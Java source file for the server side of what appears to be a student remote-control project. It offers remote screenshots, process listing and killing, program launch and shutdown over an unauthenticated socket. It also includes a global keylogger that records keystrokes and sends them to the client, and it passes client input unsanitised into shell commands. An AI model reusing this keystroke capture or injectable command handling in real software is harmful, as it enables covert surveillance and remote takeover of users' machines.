package Server;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.NativeInputEvent;
import com.github.kwhat.jnativehook.dispatcher.SwingDispatchService;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.io.*;
import java.net.*;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.*;

public class ServerControl extends JFrame implements ActionListener {
    private JButton openServerButton;
    private JButton closeServerButton;
    private JButton exitServerButton;
    private JPanel ServerControl;
    private JTextField ServerIPShow;
    private JLabel ServerIPLabel;
    /*-----------------------------------------------------------------------------------------------------*/
    public static Socket socket;
    public static ServerSocket serverSocket;
    public static BufferedReader inFromClient;
    public static PrintWriter outToClient;
    public static ObjectOutputStream ImgOut;
    public static ByteArrayOutputStream ous;
    /*-----------------------------------------------------------------------------------------------------*/

    public ServerControl()
    {
//        GlobalScreen.setEventDispatcher(new SwingDispatchService());
        setContentPane(ServerControl);
        setTitle("Server Controller");
        setSize(400,150);
        setBounds(1000,150,400,150);
        setVisible(true);
        setDefaultCloseOperation(EXIT_ON_CLOSE);

        openServerButton.addActionListener(this);
        closeServerButton.addActionListener(this);
        exitServerButton.addActionListener(this);
        ServerIPShow.addActionListener(this);

        String serverIP = null;
        try{
            serverIP = InetAddress.getLocalHost().getHostAddress();
        }catch (UnknownHostException ex) {
            Logger.getLogger(Server.ServerControl.class.getName()).log(Level.SEVERE,null,ex);
        }

        ServerIPShow.setText(serverIP);


    }

    public String receivedSignal(String s)
    {
        try {
            s = inFromClient.readLine();
        } catch (IOException ex) {
            Logger.getLogger(Server.ServerControl.class.getName()).log(Level.SEVERE,null,ex);
        }
        return s;
    }
    public static String convertString(String s)
    {
        String result = "";
        for(int i = 0; i<s.length(); i++)
        {
            char x = s.charAt(i);
            if(!Character.isSpaceChar(x) || !Character.isSpaceChar(s.charAt(i + 1)))
                result = result + x;
        }
        return result;
    }
    public static int countString() throws IOException{
        int size = 0;
        int k = 0;
        Process process = Runtime.getRuntime().exec("tasklist.exe");
        Scanner scanner = new Scanner(new InputStreamReader(process.getInputStream()));

        while (scanner.hasNext())
        {
            //String temp = countString(scanner.nextLine());
            if (k>=0)
            {
                String temp = scanner.nextLine();         size++;
            }
            else
            {
                scanner.nextLine();         k++;          size++;
            }
        }

        scanner.close();
        return size-3;
    }
    public static int countListApp() throws IOException{
        int k = 0;
        Process process = Runtime.getRuntime().exec("powershell.exe Get-Process | Select MainWindowTitle,Id");
        Scanner scanner = new Scanner(new InputStreamReader(process.getInputStream()));

        while (scanner.hasNext())
        {
            if (k>=0)
            {
                String temp = scanner.nextLine().trim();
                if (countWordIn(temp)!=1) k++;
            }
            else scanner.nextLine();
        }

        scanner.close();
        return k-3;
    }
    public static int countWordIn(String s){
        StringTokenizer stringTokenizer = new StringTokenizer(s);
        return stringTokenizer.countTokens();
        // wordInString = stringTokenizer.countTokens();
    }

    public void shutdown() throws IOException
    {
        String s = Server.ServerControl.inFromClient.readLine();
        try{
            Runtime runtime = Runtime.getRuntime();
            Process process = runtime.exec("shutdown -s -t "+s);
            System.exit(0);
        } catch (Exception ex) {
            JOptionPane.showMessageDialog(null,ex);
        }
    }

    public static String hookString = "";
    public static boolean hook, firsthook = false;
    public void openServer()
    {
        boolean connected = true;

        //===========================================================================================================================================
        try {
            serverSocket = new ServerSocket(6789);
            System.out.println("Server started");
            System.out.println("Waiting for a client ...");

            socket = serverSocket.accept();

            if (serverSocket == null){
                JOptionPane.showMessageDialog(rootPane, "Can't connect to server");
                return;
            }
            else System.out.println("Client accepted");

            inFromClient = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            outToClient = new PrintWriter(socket.getOutputStream());
        }
        catch (IOException ex) {
            Logger.getLogger(ServerControl.class.getName()).log(Level.SEVERE, null, ex);
        }
        //===========================================================================================================================================

        String s = "";

        while(connected)
        {
            s = receivedSignal(s);
            switch (s) {
                case "SHUTDOWN":
                {
                    try {
                        shutdown();
                    } catch (IOException ex) {
                        Logger.getLogger(ServerControl.class.getName()).log(Level.SEVERE, null, ex);
                    }
                    break;
                }
                //===========================================================================================================================================
                case "DISCONNECTED":
                {
                    System.out.println("Server Closed");
                    try {
                        serverSocket.close();
                        connected = false;
                    } catch (IOException ex) {
                        Logger.getLogger(ServerControl.class.getName()).log(Level.SEVERE, null, ex);
                    }
                    break;
                }
                //===========================================================================================================================================
                case "TAKE":
                {
                    try
                    {
                        Robot r = new Robot();
                        ous = new ByteArrayOutputStream();
                        //String path = "E://Java//Screenshot//tmp.jpg";

                        Rectangle capture = new Rectangle(0,0,(int) Toolkit.getDefaultToolkit().getScreenSize().getWidth(), (int) Toolkit.getDefaultToolkit().getScreenSize().getHeight());
                        BufferedImage Image = r.createScreenCapture(capture);
                        ImageIO.write(Image, "png", ous);

                        byte[] bytes = ous.toByteArray();
                        ImgOut = new ObjectOutputStream(socket.getOutputStream());
                        ImgOut.writeObject(bytes);
                        ImgOut.flush();
                    }
                    catch(AWTException | IOException ex){
                        JOptionPane.showMessageDialog(null, ex);
                    }
                    break;
                }
                //===========================================================================================================================================
                case "SHOW_PROCESS":
                {
                    int dodai = 0;
                    try {
                        dodai = countString();
                    } catch (IOException ex) {
                        Logger.getLogger(ServerControl.class.getName()).log(Level.SEVERE, null, ex);
                    }

                    String size = Integer.toString(dodai);
                    outToClient.println(size);
                    outToClient.flush();

                    int k = 0;
                    Process process = null;
                    try {
                        process = Runtime.getRuntime().exec("tasklist.exe");
                    } catch (IOException ex) {
                        Logger.getLogger(ServerControl.class.getName()).log(Level.SEVERE, null, ex);
                    }

                    if(process == null) continue;
                    Scanner scanner = new Scanner(new InputStreamReader(process.getInputStream()));

                    String temp;
                    while (scanner.hasNext())
                    {
                        if (k>=4)
                        {
                            temp = scanner.nextLine();
                            temp = convertString(temp).trim();

                            outToClient.println(temp);
                            outToClient.flush();
                        }
                        else scanner.nextLine();
                        k++;
                    }
                    scanner.close();
                    break;
                }
                //===========================================================================================================================================                   //===========================================================================================================================================                   //===========================================================================================================================================                   //===========================================================================================================================================
                case "SHOW_APPLICATION":
                {
                    int k2 = 0;
                    int stop = 0;
                    try {
                        stop = countListApp();
                        outToClient.println(Integer.toString(stop));
                        outToClient.flush();
                    } catch (IOException ex) {
                        Logger.getLogger(ServerControl.class.getName()).log(Level.SEVERE, null, ex);
                    }

                    int count = 0;
                    Process process = null;
                    try {
                        process = Runtime.getRuntime().exec("powershell.exe Get-Process | Select MainWindowTitle,Id");
                    } catch (IOException ex) {
                        Logger.getLogger(ServerControl.class.getName()).log(Level.SEVERE, null, ex);
                    }

                    if(process == null) continue;
                    Scanner scanner = new Scanner(new InputStreamReader(process.getInputStream()));

                    while (scanner.hasNext())
                    {
                        if (k2 >= 3 && count != stop)
                        {
                            String temp = scanner.nextLine().trim();
                            if (countWordIn(temp) != 1)
                            {
                                outToClient.println(temp);
                                outToClient.flush();
                                count++;
                            }
                        }
                        else {
                            scanner.nextLine();         k2++;
                        }
                    }
                    scanner.close();
                    break;
                }
                //===========================================================================================================================================                   //===========================================================================================================================================
                case "KILL_PID":
                {
                    String pid = "";

                    try {
                        pid = inFromClient.readLine();
                    } catch (IOException ex) {
                        Logger.getLogger(ServerControl.class.getName()).log(Level.SEVERE, null, ex);
                    }

                    boolean isKilled = false;

                    if (pid != "")
                    {
                        String cmd = "taskkill /F /PID " + pid;
                        try {
                            Runtime.getRuntime().exec(cmd);
                        } catch (IOException ex) {
                            Logger.getLogger(ServerControl.class.getName()).log(Level.SEVERE, null, ex);
                        }

                        isKilled = true;
                    }

                    if (!isKilled)
                    {
                        JOptionPane.showMessageDialog(rootPane, "Lỗi xảy ra");
                    }
                    break;
                }
                //===========================================================================================================================================
                case "START":
                {
                    try {
                        String process = inFromClient.readLine();
                        Runtime.getRuntime().exec("powershell.exe Start-Process " + process);
                    } catch (IOException ex) {
                        Logger.getLogger(ServerControl.class.getName()).log(Level.SEVERE, null, ex);
                    }
                    break;
                }
                //===========================================================================================================================================
                case "HOOK":
                {
                    hookString = "";
                    if(!firsthook)
                    {
                        if(!GlobalScreen.isNativeHookRegistered())
                        {
                            try {
                                GlobalScreen.registerNativeHook();
                            } catch (NativeHookException e) {
                                throw new RuntimeException(e);
                            }
                        }
                        GlobalScreen.addNativeKeyListener(new Keylogger1());

                        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
                        logger.setLevel(Level.WARNING);

                        logger.setUseParentHandlers(false);
                        firsthook = true;
                    }
//                    GlobalScreen.setEventDispatcher(new SwingDispatchService());

                    hook = true;
                    break;
                }
                case "UNHOOK":
                {
                    if(!GlobalScreen.isNativeHookRegistered())
                    {
                        try {
                            GlobalScreen.unregisterNativeHook();
                        } catch (NativeHookException e) {
                            throw new RuntimeException(e);
                        }
                    }
                    hook = false;
                    break;
                }
                case "PRINT":
                {
                    if (!hook) hookString = "";

                    System.out.println("hookString: " + hookString + " end");

                    outToClient.println(hookString);
                    outToClient.flush();
                }
                case "CLEARKEY": { hookString = ""; }
                default: break;
            }
        }
    }

    public static class Keylogger1 implements NativeKeyListener
    {

        public void nativeKeyPressed(NativeKeyEvent e)
        {
            String key = NativeKeyEvent.getKeyText(e.getKeyCode());
            if (key.length() > 1) key = "[" + key + "]";

            hookString = hookString + key;

//            if(key.length() > 1) System.out.println(key);
//            else System.out.print(key);
//
//            outToClient.println(key);
//            outToClient.flush();
        }
        public void nativeKeyReleased(NativeKeyEvent e) {
        }
        public void nativeKeyTyped(NativeKeyEvent e) {
        }
    }

    public void actionPerformed(ActionEvent e)
    {
        if(e.getSource() == exitServerButton)
        {
            System.exit(0);
        }
        else if(e.getSource() == openServerButton)
        {
            openServer();
        }
        else if(e.getSource() == closeServerButton)
        {
            try {
                serverSocket.close();
            } catch (IOException ex) {
                Logger.getLogger(ServerControl.class.getName()).log(Level.SEVERE, null, ex);
            }
//            JOptionPane.showMessageDialog(ServerControl,"this is closeServer button!");
        }
    }

    public static void main(String[] args)
    {
        new ServerControl();
    }
}
